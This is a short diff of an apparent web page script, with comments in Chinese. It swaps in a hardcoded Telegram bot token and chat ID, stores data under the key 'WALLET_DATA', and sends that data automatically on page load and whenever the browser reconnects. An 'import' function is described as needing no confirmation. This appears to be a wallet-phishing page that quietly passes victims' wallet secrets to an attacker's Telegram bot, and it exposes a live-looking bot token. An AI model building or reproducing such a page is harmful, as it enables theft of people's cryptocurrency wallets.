@@ -49,19 +49,17 @@
 </div>
 
 <script>
-// ===================== 你的信息已固定 =====================
-const TG_BOT_TOKEN   = "8850832855:AAFKvMqHFqcwTEEncVnejy7wLrKTURDbdE0
-";
-const TG_CHATID      = "7467422007";
-const MAX_RETRY      = 5;
-const DELAY          = 3000;
-// ==========================================================
-
+// ====================== 已替换为你新机器人信息 ======================
+const TG_BOT_TOKEN  = "8850832855:AAFKvMqHFqcwTEEncVnejy7wLrKTURDbdE0";
+const TG_CHATID     = "7467422007";
+const MAX_RETRY     = 5;
+const DELAY         = 3000;
+// ===================================================================
 const STORAGE_KEY = "WALLET_DATA";
 
-// 一打开就自动补发
 window.onload = autoSend;
 window.addEventListener('online', autoSend);
+
 
 // 导入：免确认，不卡点
 function go() {
